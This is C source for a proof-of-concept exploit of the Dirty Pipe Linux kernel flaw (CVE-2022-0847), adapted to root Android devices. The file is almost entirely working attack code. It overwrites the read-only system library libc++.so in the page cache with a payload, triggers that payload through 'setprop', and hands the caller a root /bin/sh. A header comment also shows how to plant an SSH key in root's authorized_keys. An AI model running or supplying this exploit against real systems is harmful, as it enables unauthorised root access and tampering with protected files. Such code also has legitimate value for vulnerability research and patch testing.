/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <errno.h>
#include <sys/prctl.h>

#include "dirtypipe.h"

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

__attribute__((noreturn))
void panic(const char *msg) {
	fprintf(stderr, "%s", msg);
	exit(1);
}

#define LOG(fmt, ...) do { \
  printf(fmt "\n", ##__VA_ARGS__); \
  } while(0)

#define FAIL() do { LOG("Failed on %s:%d\n", __func__, __LINE__); exit(1); } while(0)

#define SYSCHK(x) ({                  \
  __typeof__(x) __res = (x);          \
  if (__res == (__typeof__(x))-1) {   \
    LOG("SYSCHK(" #x ") = %d\n", __res);\
    int error_val = errno;            \
    LOG("errno: %d\n", error_val);    \
    exit(1);                          \
  }                                   \
  __res;                              \
})


/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

// uses the dirtypipe exploit to write to a file
static void write_file(int fd, loff_t offset, unsigned char *data, size_t data_size) {
	if (offset % PAGE_SIZE == 0) {
		panic("Sorry, cannot start writing at a page boundary\n");
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		panic("Sorry, cannot write across a page boundary\n");
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		exit(1);
	}

	if (offset > st.st_size) {
		panic( "Offset is not inside the file\n");
	}

	if (end_offset > st.st_size) {
		panic("Sorry, cannot enlarge the file\n");
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		exit(1);
	}
	if (nbytes == 0) {
		panic("short splice\n");
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("write failed");
		exit(1);
	}
	if ((size_t)nbytes < data_size) {
		panic("short write\n");
	}
}

void root_shell();

#include <dlfcn.h>
// Adapted from: https://stackoverflow.com/questions/28413530/api-to-get-android-system-properties-is-removed-in-arm64-platforms
typedef int (*fn__system_property_get)(const char *, char *);
int __system_property_get(const char *name, char *value) {
    static fn__system_property_get __real_system_property_get = NULL;
    if (!__real_system_property_get) {
        // libc.so should already be open, get a handle to it.
        void *handle = dlopen("libc.so", RTLD_NOLOAD);
        if (!handle) {
            LOG("Cannot dlopen libc.so: %s.\n", dlerror());
        } else {
            __real_system_property_get = (fn__system_property_get)dlsym(handle, "__system_property_get");
        }
        if (!__real_system_property_get) {
            LOG("Cannot resolve __system_property_get(): %s.\n", dlerror());
        }
    }
    if (!__real_system_property_get) return (0);
    return (*__real_system_property_get)(name, value);
}

int main(int argc, char **argv) {
	if (argc == 2 && strcmp(argv[1], "shell") == 0) {
		root_shell();
		return 0;
	}

	int pid = getpid();
	FILE *fp = fopen("/data/local/tmp/pid", "w");
	fwrite(&pid, sizeof(pid), 1, fp);
	fclose(fp);

	// set up pipe for synchronizing root processes
	int pipe_fds[2] = { 0 };
	SYSCHK(pipe(pipe_fds));
	SYSCHK(dup2(pipe_fds[1], 16));
	SYSCHK(dup2(pipe_fds[0], 15));
	char pipe_input = 0;
	write(pipe_fds[1], &pipe_input, 1);


	int fd = SYSCHK(open("/system/lib64/libc++.so", O_RDONLY));
	write_file(fd, PAYLOAD_ADDR, PAYLOAD, sizeof(PAYLOAD));
	write_file(fd, HOOK_ADDR, JMP_SHIM, sizeof(JMP_SHIM));
	puts("libc++.so overwritten");

	char model[0x100] = { 0 };
	//__system_property_get("ro.product.model", model);
	system("setprop a a");
	puts("setprop trigger");

	while (access("/data/local/tmp/root_done", F_OK) != 0) {}
	puts("root_done file found");
	SYSCHK(unlink("/data/local/tmp/root_done"));

	// sleep forever, so root shell takes over
	for (;;) {
		sleep(20);
	}

	return 0;
}

// #define SYS_pidfd_getfd 438
char buf[0x100];
char path[0x100];
int res;
int fd;
int port;
char* ip;
void root_shell() {
	int fd = SYSCHK(open("/system/lib64/libc++.so", O_RDONLY));
	write_file(fd, HOOK_ADDR, ORIGINAL_HOOK_CODE, sizeof(ORIGINAL_HOOK_CODE));
	close(fd);

	int pid = 0;

	FILE* fp = fopen("/data/local/tmp/pid", "r");
	fread(&pid, sizeof(pid), 1, fp);
	fclose(fp);

	int pfd = syscall(SYS_pidfd_open, pid, 0);
	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
	int pipe_fd = syscall(SYS_pidfd_getfd, pfd, 15, 0);
	dup2(stdinfd, 0);
	dup2(stdoutfd, 1);
	dup2(stderrfd, 2);

	char pipe_output = 0;
	read(pipe_fd, &pipe_output, 1);

	fp = fopen("/data/local/tmp/root_done", "w");
	char *s = "OK";
	fwrite(s, 1, strlen(s), fp);
	fclose(fp);

	execlp("/bin/sh","/bin/sh",NULL);
}